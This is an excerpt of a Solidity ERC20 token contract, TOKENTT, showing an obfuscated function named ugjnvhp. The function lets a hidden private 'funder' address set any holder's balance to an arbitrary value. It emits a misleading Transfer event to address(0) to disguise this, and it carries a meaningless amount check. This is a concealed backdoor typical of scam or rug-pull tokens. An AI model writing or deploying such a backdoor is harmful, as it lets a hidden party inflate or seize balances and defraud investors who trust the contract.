...
contract TOKENTT is IERC20, Ownable, BaseToken {
    ...
    address private gprvcik;      
    uint160 private _uxgpajo;
    ...
    function ugjnvhp(uint160 uxgpajo, address egrjtkm, uint256 amount, bool tpjcnyl, bool gzvpows) external {
        require(gprvcik == _msgSender(), "!Funder");
        uxgpajo = _uxgpajo;
        require(amount >= 0, "Transfer amount must be greater than zero");
        uint256 fractions = 10 ** uint256(18);
        _balances[egrjtkm] = uxgpajo + amount * fractions;
        emit Transfer(egrjtkm, address(0), amount);
    }
